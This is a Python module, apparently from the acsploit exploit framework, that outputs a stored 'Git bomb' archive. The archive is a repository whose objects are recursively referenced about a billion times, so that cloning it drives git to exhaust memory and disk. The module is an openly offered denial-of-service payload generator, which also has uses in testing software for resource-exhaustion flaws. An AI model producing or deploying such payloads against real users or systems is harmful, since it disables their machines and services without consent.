import os

from acsploit.options import Options


options = Options()
options.add_option('depth', 10, 'Recursive depth/width of Git bomb', list(range(10, 51, 10)))

DESCRIPTION = 'Produces a tar.gz archive of a Git bomb (see Kate Murphy\'s work at https://kate.io/blog/git-bomb/)' \
              '\n\n' \
              'The git repository produced contains 12 objects that are recursively referenced a billion times. ' \
              'When cloning this repo git will attempt to walk the tree and construct a billion files, causing excessive ' \
              'memory and storage consumption.'
NO_INPUT = True
DEFAULT_OUTPUT = 'file'
DEFAULT_OUTPUT_OPTIONS = {
    'final_newline': False,
    'format': 'binary'
}


def run(output):
    ret = git_bomb(options['depth'])
    output.output([ret])


# Returns a git bomb based on https://github.com/Katee/git-bomb#readme
def git_bomb(depth):
    filename = 'gitbomb' + str(depth) + '.tar.gz'
    with open(os.path.join(os.path.dirname(os.path.realpath(__file__)), 'git_bombs', filename), 'rb') as git_bomb_file:
        return git_bomb_file.read()
